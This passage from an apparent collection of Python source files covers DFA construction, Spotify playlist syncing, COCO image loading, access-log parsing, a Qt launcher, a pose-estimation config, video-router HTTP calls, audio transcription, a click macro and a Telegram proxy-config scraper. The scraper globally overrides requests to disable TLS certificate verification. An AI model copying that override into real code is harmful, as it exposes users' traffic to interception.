trans_dict in state_map.items():\n        for dest in trans_dict.values():\n            if len(dest) > 1:\n                is_nfa = True\n                break\n        if is_nfa:\n            break\n    \n    if is_nfa:\n        pass\n    else:\n        d = DFA(list(alphabet))\n        state_map_obj: dict[str, DFAState] = {}\n\n        for s in state_map.keys():\n            state_map_obj[s] = DFAState(s, alphabet)\n        \n        # add transitions\n        for s, trans_dict in state_map.items():\n            for trans, dest_list in trans_dict.items():\n                state_map_obj[s].add_transition(trans, state_map_obj[dest_list[0]])\n        \n        for s in state_map_obj.values():\n            d.add_state(s)\n        \n        # set start and final states\n        if len(start_states) != 1:\n            raise ValueError(\"Only one start state is allowed\")\n        d.start_state = state_map_obj[start_states[0]]\n        d.final_states = list(map(lambda x: state_map_obj[x], final_states))\n        # d.display()\n        return (\"DFA\", d)\n",
    "import spotipy\nfrom spotipy.oauth2 import SpotifyOAuth\nimport json\nfrom constants import SPOTIPY_CLIENT_ID, SPOTIPY_CLIENT_SECRET, SPOTIPY_REDIRECT_URI, PROXIES, PLAYLIST_ID\nfrom utilities import TrackManager, LoggerSetup\nfrom typing import List, Dict\n\n\nclass SpotifyService:\n    def __init__(self):\n        self.scope = 'user-library-read,user-library-modify,playlist-modify-public'\n        self.client = self._init_spotify_client()\n        self.logger = LoggerSetup.setup_logger()\n        self.removed_tracks = []\n\n    def _init_spotify_client(self) -> spotipy.Spotify:\n        auth_manager = SpotifyOAuth(client_id=SPOTIPY_CLIENT_ID, client_secret=SPOTIPY_CLIENT_SECRET,\n                                    redirect_uri=SPOTIPY_REDIRECT_URI, proxies=PROXIES, open_browser=False,\n                                    scope=self.scope, cache_path=\".cache\")\n        return spotipy.Spotify(auth_manager=auth_manager, proxies=PROXIES)\n\n    def fetch_and_refresh_tracks(self):\n        self.logger.info(\"\u0417\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u0442\u0440\u0435\u043a\u043e\u0432 \u0438\u0437 Spotify\u2026\")\n        filename = 'spotify_tracks.json'\n        track_manager = TrackManager(filename)\n        liked_tracks = []\n        results = self.client.current_user_saved_tracks()\n        counter = 0\n        while results['next']:\n            counter += 1\n            self.logger.info(f\"\u0417\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u0441\u0442\u0440\u0430\u043d\u0438\u0446\u044b {counter}...\")\n            liked_tracks.extend(results['items'])\n            results = self.client.next(results)\n        track_manager.refresh_tracks(liked_tracks, 'spotify')\n\n    def add_to_spotify(self, tracks: List[Dict]):\n        for track in tracks:\n            try:\n                track_info = \\\n                    self.client.search(q=f\"{track['artist']} {track['track_name']}\", type='track')['tracks'][\n                        'items'][0]\n                track_id = track_info['id']\n                self.client.current_user_saved_tracks_add([track_id])\n                self.client.playlist_add_items(playlist_id=PLAYLIST_ID, items=[track_id])\n            except IndexError:\n                self.logger.warning(f'\u0422\u0440\u0435\u043a {track[\"track_name\"]} \u0438\u0441\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044f {track[\"artist\"]} \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d \u043d\u0430 Spotify.')\n\n        self.remove_duplicates()\n\n    def remove_duplicates(self):\n        self.logger.info(\"\u0423\u0434\u0430\u043b\u0435\u043d\u0438\u0435 \u0434\u0443\u0431\u043b\u0438\u043a\u0430\u0442\u043e\u0432...\")\n        liked_tracks = []\n        deleted_track_ids = []\n        results = self.client.current_user_saved_tracks()\n        counter = 0\n        while results['next']:\n            liked_tracks.extend(results['items'])\n            results = self.client.next(results)\n\n        for i in range(len(liked_tracks) - 1, -1, -1):\n            track_id = liked_tracks[i]['track']['id']\n            if track_id not in deleted_track_ids:\n                for j in range(i - 1, -1, -1):\n                    if track_id == liked_tracks[j]['track']['id']:\n                        counter += 1\n                        self.client.current_user_saved_tracks_delete([track_id])\n                        deleted_track_ids.append(\n                            {'id': track_id, 'artist': liked_tracks[j]['track']['artists'][0]['name'],\n                             'track_name': liked_tracks[j]['track']['name']})\n                        break\n        if counter > 0:\n            self.logger.info(f\"\u0423\u0434\u0430\u043b\u0435\u043d\u043e {counter} \u0434\u0443\u0431\u043b\u0438\u043a\u0430\u0442\u043e\u0432.\")\n            with open('deleted_spotify_tracks.json', 'w', encoding='utf-8') as f:\n                json.dump(deleted_track_ids, f, ensure_ascii=False, indent=4)\n        else:\n            self.logger.info(\"\u0414\u0443\u0431\u043b\u0438\u043a\u0430\u0442\u043e\u0432 \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d\u043e.\")\n",
    "import cocoHelper\nimport tfHelper\nimport pathlib\nimport os\nimport matplotlib.pyplot as plt\nimport pandas as pd\nimport numpy as np\nimport tkinter as tk\nimport tensorflow as tf\nimport os\nimport cv2\nfrom tkinter import filedialog\nfrom pycocotools.coco import COCO\nfrom matplotlib import pyplot as plt\nfrom keras.models import Sequential\nfrom keras.layers import Conv2D, MaxPooling2D, Flatten, Dense, Dropout\n#from keras.preprocessing.image import ImageDataGenerator\n\n\n\nmodel = Sequential([\n    Conv2D(32, (3, 3), activation='relu', input_shape=(150, 150, 3)),\n    MaxPooling2D(2, 2),\n    Conv2D(64, (3, 3), activation='relu'),\n    MaxPooling2D(2, 2),\n    Conv2D(128, (3, 3), activation='relu'),\n    MaxPooling2D(2, 2),\n    Flatten(),\n    Dense(512, activation='relu'),\n    Dropout(0.5),\n    Dense(1, activation='sigmoid')  # Gebruik 'sigmoid' voor twee klassen; vervang door 'softmax' voor meerdere klassen\n])\n\n# train_datagen = ImageDataGenerator(rescale=1./255, rotation_range=40, width_shift_range=0.2,\n#                                    height_shift_range=0.2, shear_range=0.2, zoom_range=0.2,\n#                                    horizontal_flip=True, fill_mode='nearest')\n\n# model.compile(optimizer='adam',\n#               loss='binary_crossentropy',  # Gebruik 'categorical_crossentropy' voor meerdere klassen\n#               metrics=['accuracy'])\n# Initialiseer Tkinter root widget\nroot = tk.Tk()\nroot.withdraw()  # We willen niet de volledige GUI, dus sluiten we het hoofdvenster\n\n# Open een dialoogvenster om de annotaties.json te selecteren\nannotations_path = filedialog.askopenfilename(\n    title=\"Selecteer het COCO annotaties bestand (_annotations.coco.json)\"\n)\n\n# Open een dialoogvenster om de afbeeldingen directory te selecteren\nimages_dir = filedialog.askdirectory(\n    title=\"Selecteer de map met COCO afbeeldingen\"\n)\n\n# Controleer of de paden geldig zijn\nif not os.path.exists(annotations_path) or not os.path.exists(images_dir):\n    raise ValueError(\"Een van de geselecteerde paden bestaat niet.\")\n\n# Laad de COCO annotaties\ncoco = COCO(annotations_path)\n\n# Krijg alle afbeelding IDs\nimage_ids = coco.getImgIds()\n\n# Loop door een subset van afbeeldingen (vervang len(image_ids) met een kleiner getal om te testen)\nfor i in range(len(image_ids)):\n    # Verkrijg afbeelding metadata\n    img_info = coco.loadImgs(image_ids[i])[0]\n    \n    # Pad naar de afbeelding\n    img_path = os.path.join(images_dir, img_info['file_name'])\n    \n    # Laad de afbeelding\n    img = cv2.imread(img_path)\n    img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)  # Converteer BGR naar RGB\n    \n    # Toon de afbeelding\n    plt.imshow(img)\n    plt.axis('off')\n    plt.show()\n    \n    # Stop na het tonen van \u00e9\u00e9n afbeelding voor dit voorbeeld\n    #break\n",
    "#!/usr/bin/env python\n# encoding: utf-8\n# Author: s1mpr0\nimport re\nimport argparse\nimport openpyxl\nimport io\nimport datetime\nimport urllib.parse\n\ndef find(pat,text):\n    format_info = {}\n    match = re.match(pat, text)\n    if match:\n        return match.groupdict()\n    else:\n        return {}\ndef extend_info(format_info):\n    #\u6269\u5c55\u540e\u7f00\u4fe1\u606f\n    format_info['file_name_suffix'] = ''\n    format_info['referer_host'] = ''\n    if format_info.get('uri'):\n        urllib.parse.urlparse(format_info.get('uri'))\n        if '/' in urllib.parse.urlparse(format_info.get('uri')).path:\n            file_name = urllib.parse.urlparse(format_info.get('uri')).path.split('/')[-1]\n            if '.' in file_name:\n                file_name_suffix = file_name.split('.')[-1]\n                if file_name_suffix:\n                    format_info['file_name_suffix'] = file_name_suffix\n    if format_info.get('referrer'):\n        tmp_host =  urllib.parse.urlparse(format_info.get('referrer')).hostname   \n        if tmp_host:\n            format_info['referer_host'] = tmp_host\n    if format_info.get('datetime'):\n        \n\n        # \u8f6c\u6362\u524d\u7684\u683c\u5f0f\n        original_format = \"%d/%b/%Y:%H:%M:%S %z\"\n\n        # \u8f6c\u6362\u4e3adatetime\u5bf9\u8c61\n        datetime_obj = datetime.datetime.strptime(format_info.get('datetime'), original_format)\n\n        # \u8bbe\u5b9a\u76ee\u6807\u683c\u5f0f\n        target_format = \"%Y/%m/%d %H:%M:%S\"\n        # \u8f6c\u6362\u4e3a\u76ee\u6807\u683c\u5f0f\u7684\u5b57\u7b26\u4e32\n        converted_datetime_str = datetime_obj.strftime(target_format)\n        format_info['datetime'] = converted_datetime_str\n\ndef parse_line_log(log_line):\n    format_infos = []\n    #print(log_line)\n    pats = [\n            r'(?P<ip>\\d+\\.\\d+\\.\\d+\\.\\d+) - (?P<username>\\S+) \\[(?P<datetime>.+?)\\] \"(?P<method>\\w+) (?P<uri>.+?) HTTP/1.1\" (?P<status>\\d+) (?P<length>\\d+) \"(?P<referrer>.+?)\" \"(?P<user_agent>.+?)\"',\n            r'(?P<ip>\\d+\\.\\d+\\.\\d+\\.\\d+) - (?P<username>\\S+) \\[(?P<datetime>.+?)\\] \"(?P<method>\\w+) (?P<uri>.+?)\" (?P<status>\\d+) (?P<length>\\d+) \"(?P<referrer>.+?)\" \"(?P<user_agent>.+?)\"',\n            r'(?P<ip>\\d+\\.\\d+\\.\\d+\\.\\d+) - (?P<username>\\S+) \\[(?P<datetime>.+?)\\] \"(?P<uri>.+?)\" (?P<status>\\d+) (?P<length>\\d+) \"(?P<referrer>.+?)\" \"(?P<user_agent>.+?)\"',\n            r'(?P<ip>\\d+\\.\\d+\\.\\d+\\.\\d+) - (?P<username>\\S+) \\[(?P<datetime>.+?)\\] \"\" (?P<status>\\d+) (?P<length>\\d+) \"(?P<referrer>.+?)\" \"(?P<user_agent>.+?)\"',\n        ]\n    #if '/cgi-bin/readycloud_control.cgi' in log_line:\n    #    import pdb;pdb.set_trace()\n    for pat in pats:\n        format_info = find(pat, log_line)\n        if format_info:\n            extend_format_info = extend_info(format_info)\n            format_infos.append(format_info)\n            break\n    return format_infos\ndef reorder_keys(keys):\n    new_keys = []\n    keys = [k for k  in keys]\n    first_seqs = ['ip','username','datetime','file','status','method','uri','file_name_suffix','referer_host','referrer','user_agent']\n    for _seq in first_seqs:\n        if _seq in keys:\n            new_keys.append(_seq)\n            keys.remove(_seq)\n    if keys:\n        for _key in keys:\n            new_keys.append(_key)\n    return new_keys\ndef transkeys2chinese(keys):\n    chinese_keys = {\n        'file_name_suffix':'\u6587\u4ef6\u540e\u7f00',\n        'datetime':'\u65f6\u95f4',\n    }\n    return [chinese_keys.get(key,key) for key in keys]\n    \n\n\ndef trans2excel(log_infos:list):\n    print('writing to excel')\n    wrorkbook = openpyxl.Workbook()\n    sheet = wrorkbook.active\n    if log_infos:\n        keys_seq = reorder_keys(log_infos[0].keys())\n        sheet.append(transkeys2chinese(keys_seq))\n        for log_info in log_infos:\n            sheet.append([log_info.get(key,'') for key in keys_seq ])\n    file_name = 'accesslog_{}.xlsx'.format(str(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')).replace(' ','_'))\n    wrorkbook.save(filename = file_name)\n    print('The log file has been parsed and saved as {}'.format(file_name))\n\ndef process(file_name:str):\n    if not file_name:\n        return False\n    lines = open(file_name,'r').readlines()\n    line_count = len(lines)\n    log_infos = []\n    error_line_count = 0\n    i = 1\n    for line in lines:\n        tmp_infos = parse_line_log(line)\n\n        if tmp_infos and isinstance(tmp_infos, list):\n            log_infos.append(tmp_infos[0])\n        else:\n            error_line_count = error_line_count + 1\n            print('Error line:{}'.format(line))\n        if i % 1000 == 0:\n            print('Processing {}/{} = {}%,with error line count:{}'.format(i,line_count,int(i * 100 / line_count),error_line_count))\n        i = i + 1\n    if log_infos:\n        trans2excel(log_infos)\n        \n        \n#\u4ece\u547d\u4ee4\u884c\u4f20\u5165\u6587\u4ef6\u540d\n\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description = 'Parse log file,usage: parselog.py -f filename')\n    parser.add_argument('-f','--file_name',type=str,help = 'please input the log file path and name')\n    args = parser.parse_args()\n    process(args.file_name)",
    "\"\"\"\n * Copyright(c) 2024 Sven Trittler\n *\n * This program and the accompanying materials are made available under the\n * terms of the Eclipse Public License v. 2.0 which is available at\n * http://www.eclipse.org/legal/epl-2.0, or the Eclipse Distribution License\n * v. 1.0 which is available at\n * http://www.eclipse.org/org/documents/edl-v10.php.\n *\n * SPDX-License-Identifier: EPL-2.0 OR BSD-3-Clause\n\"\"\"\n\nfrom PySide6.QtGui import QGuiApplication\nfrom PySide6.QtQml import QQmlApplicationEngine, qmlRegisterType\nfrom PySide6.QtCore import qInstallMessageHandler, QUrl\nfrom PySide6.QtGui import QIcon, QPixmap\nfrom PySide6.QtQuickControls2 import QQuickStyle\nfrom sys import platform\nimport logging\nimport sys\nimport os\n\nimport dds_data\nfrom overview_model import TreeModel, TreeNode\nfrom endpoint_model import EndpointModel\nfrom utils import qt_message_handler\n\n# generated by pyside6-rcc\nimport qrc_file \n\n\nif __name__ == \"__main__\":\n    logging.basicConfig(level=logging.DEBUG, format='%(asctime)s [%(levelname)s] [%(filename)s:%(lineno)s] %(message)s')\n\n    # Print qml log messages into the python log\n    qInstallMessageHandler(qt_message_handler)\n\n    logging.info(\"Starting App ...\")\n\n    app = QGuiApplication(sys.argv)\n    app.setWindowIcon(QIcon(QPixmap(\":/res/images/cyclonedds.png\")))\n    app.setApplicationName(\"CycloneDDS Insight\")\n    app.setApplicationDisplayName(\"CycloneDDS Insight\")\n    app.setOrganizationName(\"cyclonedds\")\n    app.setOrganizationDomain(\"org.eclipse.cyclonedds.insight\")\n\n    if platform == \"darwin\":\n        QQuickStyle.setStyle(\"macOS\")\n    else:\n        QQuickStyle.setStyle(\"Fusion\")\n\n    data = dds_data.DdsData()\n    rootItem = TreeNode(\"Root\")\n    treeModel = TreeModel(rootItem)\n\n    engine = QQmlApplicationEngine()\n    engine.rootContext().setContextProperty(\"treeModel\", treeModel)\n    engine.rootContext().setContextProperty(\"CYCLONEDDS_URI\", os.getenv(\"CYCLONEDDS_URI\", \"<not set>\"))\n    qmlRegisterType(EndpointModel, \"org.eclipse.cyclonedds.insight\", 1, 0, \"EndpointModel\")\n\n    engine.load(QUrl(\"qrc:/src/views/main.qml\"))\n    if not engine.rootObjects():\n        logging.critical(\"Failed to load qml\")\n        sys.exit(-1)\n\n    # Add default domain\n    data.add_domain(0)\n\n    logging.info(\"qt ...\")\n    ret_code = app.exec()\n    logging.info(\"qt ... DONE\")\n\n    # Clean up threads\n    data.join_observer()\n\n    sys.exit(ret_code)\n",
    "_base_ = ['../../../../_base_/datasets/coco.py']\nlog_level = 'INFO'\nload_from = None\nresume_from = None\ndist_params = dict(backend='nccl')\nworkflow = [('train', 1)]\ncheckpoint_config = dict(interval=10)\nevaluation = dict(interval=10, metric='mAP', save_best='AP')\n\noptimizer = dict(\n    type='Adam',\n    lr=1e-3,\n)\noptimizer_config = dict(grad_clip=None)\n# learning policy\nlr_config = dict(\n    policy='step',\n    warmup='linear',\n    warmup_iters=500,\n    warmup_ratio=0.001,\n    step=[200, 260])\ntotal_epochs = 300\nlog_config = dict(\n    interval=50,\n    hooks=[\n        dict(type='TextLoggerHook'),\n        # dict(type='TensorboardLoggerHook')\n    ])\n\nchannel_cfg = dict(\n    num_output_channels=17,\n    dataset_joints=17,\n    dataset_channel=[\n        [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16],\n    ],\n    inference_channel=[\n        0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16\n    ])\n\n# model settings\nmodel = dict(\n    type='TopDown',\n    backbone=dict(type='StemNet'),\n    keypoint_head=dict(\n        type='TokenPoseHead',\n        in_channels=256,\n        num_joints=channel_cfg['num_output_channels'],\n        loss_keypoint=dict(type='JointsMSELoss', use_target_weight=True),\n        tokenpose_cfg=dict(\n            feature_size=[64, 48],\n            patch_size=[4, 3],\n            dim=192,\n            depth=12,\n            heads=8,\n            mlp_ratio=3,\n            heatmap_size=[64, 48],\n            pos_embedding_type='sine-full',\n            apply_init=True\n        )),\n    train_cfg=dict(),\n    test_cfg=dict(\n        flip_test=True,\n        post_process='unbiased',\n        shift_heatmap=True,\n        modulate_kernel=11))\n\ndata_cfg = dict(\n    image_size=[192, 256],\n    heatmap_size=[48, 64],\n    num_output_channels=channel_cfg['num_output_channels'],\n    num_joints=channel_cfg['dataset_joints'],\n    dataset_channel=channel_cfg['dataset_channel'],\n    inference_channel=channel_cfg['inference_channel'],\n    soft_nms=False,\n    nms_thr=1.0,\n    oks_thr=0.9,\n    vis_thr=0.2,\n    use_gt_bbox=False,\n    det_bbox_thr=0.0,\n    bbox_file='/dockerdata/coco/person_detection_results/'\n    'COCO_val2017_detections_AP_H_56_person.json',\n)\n\ntrain_pipeline = [\n    dict(type='LoadImageFromFile'),\n    dict(type='TopDownGetBboxCenterScale', padding=1.25),\n    dict(type='TopDownRandomShiftBboxCenter', shift_factor=0.16, prob=0.3),\n    dict(type='TopDownRandomFlip', flip_prob=0.5),\n    dict(\n        type='TopDownHalfBodyTransform',\n        num_joints_half_body=8,\n        prob_half_body=0.3),\n    dict(\n        type='TopDownGetRandomScaleRotation', rot_factor=45, scale_factor=0.35),\n    dict(type='TopDownAffine'),\n    dict(type='ToTensor'),\n    dict(\n        type='NormalizeTensor',\n        mean=[0.485, 0.456, 0.406],\n        std=[0.229, 0.224, 0.225]),\n    dict(type='TopDownGenerateTarget', sigma=2, unbiased_encoding=True),\n    dict(\n        type='Collect',\n        keys=['img', 'target', 'target_weight'],\n        meta_keys=[\n            'image_file', 'joints_3d', 'joints_3d_visible', 'center', 'scale',\n            'rotation', 'bbox_score', 'flip_pairs'\n        ]),\n]\n\nval_pipeline = [\n    dict(type='LoadImageFromFile'),\n    dict(type='TopDownGetBboxCenterScale', padding=1.25),\n    dict(type='TopDownAffine'),\n    dict(type='ToTensor'),\n    dict(\n        type='NormalizeTensor',\n        mean=[0.485, 0.456, 0.406],\n        std=[0.229, 0.224, 0.225]),\n    dict(\n        type='Collect',\n        keys=['img'],\n        meta_keys=[\n            'image_file', 'center', 'scale', 'rotation', 'bbox_score',\n            'flip_pairs'\n        ]),\n]\n\ntest_pipeline = val_pipeline\n\ndata_root = '/dockerdata/coco'\ndata = dict(\n    samples_per_gpu=64,\n    workers_per_gpu=2,\n    val_dataloader=dict(samples_per_gpu=32),\n    test_dataloader=dict(samples_per_gpu=32),\n    train=dict(\n        type='TopDownCocoDataset',\n        ann_file=f'{data_root}/annotations/person_keypoints_train2017.json',\n        img_prefix=f'{data_root}/train2017/',\n        data_cfg=data_cfg,\n        pipeline=train_pipeline,\n        dataset_info={{_base_.dataset_info}}),\n    val=dict(\n        type='TopDownCocoDataset',\n        ann_file=f'{data_root}/annotations/person_keypoints_val2017.json',\n        img_prefix=f'{data_root}/val2017/',\n        data_cfg=data_cfg,\n        pipeline=val_pipeline,\n        dataset_info={{_base_.dataset_info}}),\n    test=dict(\n        type='TopDownCocoDataset',\n        ann_file=f'{data_root}/annotations/person_keypoints_val2017.json',\n        img_prefix=f'{data_root}/val2017/',\n        data_cfg=data_cfg,\n        pipeline=test_pipeline,\n        dataset_info={{_base_.dataset_info}}),\n)\n",
    "import requests\r\nimport time\r\n\r\ndef send_http_command(url, params):\r\n    response = requests.get(url, params=params)\r\n    if response.status_code != 200:\r\n        print(f\"Request to {url} failed with status code {response.status_code}.\")\r\n    else:\r\n        print(f\"Request to {url} was successful.\")\r\n\r\n# Normal Up NC2IO A ROUTES\r\n        \r\nurls = [\r\n    (\"http://172.16.1.29/v1/shortcut\", {\"name\": \"input1_video_source\", \"source_name\": \"NC1IO-BRIDGE (NC1IO (CAM1 [Home]))\"}),\r\n    (\"http://172.16.1.29/v1/shortcut\", {\"name\": \"input2_video_source\", \"source_name\": \"NC1IO-BRIDGE (NC1IO (CAM2 [1st]))\"}),\r\n    (\"http://172.16.1.29/v1/shortcut\", {\"name\": \"input3_video_source\", \"source_name\": \"NC1IO-BRIDGE (NC1IO (CAM3 [3rd]))\"}),\r\n    (\"http://172.16.1.29/v1/shortcut\", {\"name\": \"input4_video_source\", \"source_name\": \"NC1IO-BRIDGE (NC1IO (CAM4 [Outfield]))\"}),\r\n    (\"http://172.16.1.29/v1/shortcut\", {\"name\": \"input5_video_source\", \"source_name\": \"NC1IO-BRIDGE (NC1IO (CAM5 [Talent]))\"}),\r\n    (\"http://172.16.1.29/v1/shortcut\", {\"name\": \"input6_video_source\", \"source_name\": \"BIRDDOG-CROWS-NEST (CAM)\"}),\r\n    (\"http://172.16.1.29/v1/shortcut\", {\"name\": \"input7_video_source\", \"source_name\": \"Black\"}),\r\n    (\"http://172.16.1.29/v1/shortcut\", {\"name\": \"input8_video_source\", \"source_name\": \"Black\"}),\r\n    \r\n    # Normal Up NC2IO B ROUTES\r\n    (\"http://172.16.1.63/v1/shortcut\", {\"name\": \"input1_video_source\", \"source_name\": \"SOFTBALL-BRIDGE (CONVO-AIDA-HD200 (BASKET-RIGHT-172.16.1.88))\"}),\r\n    (\"http://172.16.1.63/v1/shortcut\", {\"name\": \"input2_video_source\", \"source_name\": \"SOFTBALL-BRIDGE (NC2IO-G-NDI2SDI (CAM 2 1ST ))\"}),\r\n    (\"http://172.16.1.63/v1/shortcut\", {\"name\": \"input3_video_source\", \"source_name\": \"SOFTBALL-BRIDGE (NC2IO-G-NDI2SDI (CAM3 3RD))\"}),\r\n    (\"http://172.16.1.63/v1/shortcut\", {\"name\": \"input4_video_source\", \"source_name\": \"SOFTBALL-BRIDGE (NC2IO-G-NDI2SDI (CAM4 OP OF))\"}),\r\n    (\"http://172.16.1.63/v1/shortcut\", {\"name\": \"input5_video_source\", \"source_name\": \"SOFTBALL-BRIDGE (NC2IO-G-NDI2SDI (Cam 5 HH))\"}),\r\n    (\"http://172.16.1.63/v1/shortcut\", {\"name\": \"input6_video_source\", \"source_name\": \"SOFTBALL-BRIDGE (NC2IO-G-NDI2SDI (Cam 6 - NDI OF))\"}),\r\n    (\"http://172.16.1.63/v1/shortcut\", {\"name\": \"input7_video_source\", \"source_name\": \"BIRDDOG-CROWS-NEST (CAM)\"}),\r\n    (\"http://172.16.1.63/v1/shortcut\", {\"name\": \"input8_video_source\", \"source_name\": \"Black\"})\r\n]\r\n\r\nfor url, params in urls:\r\n    send_http_command(url, params)\r\n    time.sleep(0.5)  # wait for 0.5 seconds",
    "import tkinter as tk\nfrom tkinter import filedialog, messagebox, scrolledtext\nimport os\nimport threading\nfrom pydub import AudioSegment\nfrom vosk import Model, KaldiRecognizer\nimport wave\nimport json\n\ndef convert_to_wav(audio_path, output_directory):\n    if not audio_path.lower().endswith('.wav'):\n        output_path = os.path.join(output_directory, os.path.basename(audio_path).rsplit('.', 1)[0] + '.wav')\n        audio = AudioSegment.from_file(audio_path, format=audio_path.split('.')[-1])\n        audio.export(output_path, format=\"wav\")\n        return output_path\n    else:\n        return audio_path\n\ndef transcribe_audio_vosk(audio_path, model_path, callback):\n    try:\n        model = Model(model_path)\n        with wave.open(audio_path, \"rb\") as wf:\n            recognizer = KaldiRecognizer(model, wf.getframerate())\n            full_transcription = \"\"\n            while True:\n                data = wf.readframes(4000)\n                if len(data) == 0:\n                    break\n                if recognizer.AcceptWaveform(data):\n                    part_result = json.loads(recognizer.Result())\n                    full_transcription += part_result.get('text', '') + \" \"\n            part_result = json.loads(recognizer.FinalResult())\n            full_transcription += part_result.get('text', '')\n        callback(full_transcription.strip())\n    except Exception as e:\n        messagebox.showerror(\"Error\", f\"Failed to transcribe audio. Error: {e}\")\n\ndef update_transcription_text(transcription):\n    transcription_text.configure(state='normal')\n    transcription_text.delete(1.0, tk.END)\n    transcription_text.insert(tk.END, transcription)\n    transcription_text.configure(state='disabled')\n\ndef select_model_path():\n    model_path_value = filedialog.askdirectory()\n    if model_path_value:\n        model_path.set(model_path_value)\n\ndef select_file():\n    model_path_value = model_path.get()\n    if not model_path_value or not os.path.exists(model_path_value):\n        messagebox.showerror(\"Error\", \"Please select a valid Vosk model directory.\")\n        return\n    \n    file_path = filedialog.askopenfilename()\n    if file_path:\n        output_directory = None\n        if not file_path.lower().endswith('.wav'):\n            output_directory = filedialog.askdirectory(title=\"Select Output Directory for WAV Conversion\")\n            if not output_directory:\n                messagebox.showerror(\"Error\", \"Output directory is required for non-WAV files.\")\n                return\n            file_path = convert_to_wav(file_path, output_directory)\n\n        # Transcription is run on a separate thread to keep GUI responsive\n        threading.Thread(target=transcribe_audio_vosk, args=(file_path, model_path_value, update_transcription_text), daemon=True).start()\n\nroot = tk.Tk()\nroot.title(\"AudioDictate\")\n\n# Model path selection\nmodel_path_frame = tk.Frame(root)\nmodel_path_label = tk.Label(model_path_frame, text=\"Vosk Model Path:\")\nmodel_path_label.pack(side=tk.LEFT, padx=(0, 10))\nmodel_path = tk.StringVar()\nmodel_path_entry = tk.Entry(model_path_frame, textvariable=model_path, width=50)\nmodel_path_entry.pack(side=tk.LEFT, expand=True, fill=tk.X)\nmodel_path_button = tk.Button(model_path_frame, text=\"Select\", command=select_model_path)\nmodel_path_button.pack(side=tk.LEFT)\nmodel_path_frame.pack(pady=5, padx=5, fill=tk.X)\n\n# Transcription display area\ntranscription_frame = tk.LabelFrame(root, text=\"Transcription\")\ntranscription_text = scrolledtext.ScrolledText(transcription_frame, width=60, height=15, state='disabled')\ntranscription_text.pack(expand=True, fill=tk.BOTH, padx=5, pady=5)\ntranscription_frame.pack(pady=10, padx=5, fill=tk.BOTH, expand=True)\n\n# Button to select file\nselect_file_button = tk.Button(root, text=\"Select Audio File\", command=select_file)\nselect_file_button.pack(pady=5)\n\nroot.mainloop()\n",
    "import pyautogui\nimport keyboard\nimport time\nimport json\nimport random\n\nen_pause = False\n\ndef pause_unpause():\n  global en_pause\n  en_pause = not en_pause\n  print(\"Paused\" if en_pause else \"Unpaused\")\n\ndef clique_competence(x1, y1, x2, y2, nom_macro):\n  global en_pause\n  if en_pause:\n    return\n  \n  x_init, y_init = pyautogui.position()\n  \n  x_click = random.uniform(x1, x2)\n  y_click = random.uniform(y1, y2)\n  \n  pyautogui.click(x_click, y_click)\n  \n  print(f\"{nom_macro} at ({x_click}, {y_click})\")\n  \n  pyautogui.moveTo(x_init, y_init)\n\ndef charger_macros():\n  with open('config.json', 'r') as file:\n    config = json.load(file)\n    for macro, details in config.items():\n      x1, y1 = details['position']['top_left']\n      x2, y2 = details['position']['bottom_right']\n      \n      def make_lambda(x1, y1, x2, y2, nom_macro):\n        return lambda: clique_competence(x1, y1, x2, y2, nom_macro)\n      \n      keyboard.add_hotkey(details['key'], make_lambda(x1, y1, x2, y2, macro))\n\nkeyboard.add_hotkey('esc', pause_unpause)\n\ncharger_macros()\n\nprint(\"WasherAutoMacro Script starting... Press CTRL+C to stop.\")\nprint(\"Press Escape to pause/unpause.\")\n\ntry:\n  while True:\n    time.sleep(1)\nexcept KeyboardInterrupt:\n  print(\"Script off.\")",
    "import requests\nimport threading\nimport json\nimport os \nimport time\nimport random\nimport re\nimport base64\nfrom bs4 import BeautifulSoup\nfrom datetime import datetime, timedelta\n\nrequests.post = lambda url, **kwargs: requests.request(\n    method=\"POST\", url=url, verify=False, **kwargs\n)\nrequests.get = lambda url, **kwargs: requests.request(\n    method=\"GET\", url=url, verify=False, **kwargs\n)\n\nrequests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)\n\nos.system('cls' if os.name == 'nt' else 'clear')\n\nif not os.path.exists('configtg.txt'):\n    with open('configtg.txt', 'w'): pass\n\ndef json_load(path):\n    with open(path, 'r', encoding=\"utf-8\") as file:\n        list_content = json.load(file)\n    return list_content\n\ndef substring_del(string_list):\n    string_list.sort(key=lambda s: len(s), reverse=True)\n    out = []\n    for s in string_list:\n        if not any([s in o for o in out]):\n            out.append(s)\n    return out\n\ntg_name_json = json_load('telegramchannels.json')\ninv_tg_name_json = json_load('invalidtelegramchannels.json')\n\ninv_tg_name_json[:] = [x for x in inv_tg_name_json if len(x) >= 5]\ninv_tg_name_json = list(set(inv_tg_name_json)-set(tg_name_json))\n\nthrd_pars = int(input('\\nThreads for parsing: '))\npars_dp = int(input('\\nParsing depth (1dp = 20 last tg posts): '))\n\nprint(f'\\nTotal channel names in telegramchannels.json         - {len(tg_name_json)}')\nprint(f'Total channel names in invalidtelegramchannels.json - {len(inv_tg_name_json)}')\n\nwhile (use_inv_tc := input('\\nTry looking for proxy configs from \"invalidtelegramchannels.json\" too? (Enter y/n): ').lower()) not in {\"y\", \"n\"}: pass\nprint()\n\nstart_time = datetime.now()\n\nif use_inv_tc == 'y':\n    tg_name_json.extend(inv_tg_name_json)\n    inv_tg_name_json.clear()\n    tg_name_json = list(set(tg_name_json))\n    tg_name_json = sorted(tg_name_json)\n\nsem_pars = threading.Semaphore(thrd_pars)\n\nconfig_all = list()\ntg_name = list()\nnew_tg_name_json = list()\n\nprint(f'Try get new tg channels name from proxy configs in configtg.txt...')\n\nwith open(\"configtg.txt\", \"r\", encoding=\"utf-8\") as config_all_file:\n    config_all = config_all_file.readlines()\n\npattern_telegram_user = r'(?:@)(\\w{5,})|(?:%40)(\\w{5,})|(?:t\\.me\\/)(\\w{5,})'\npattern_datbef = re.compile(r'(?:data-before=\")(\\d*)')\n\nfor config in config_all:\n    if config.startswith('vmess://'):\n        try:\n            config = 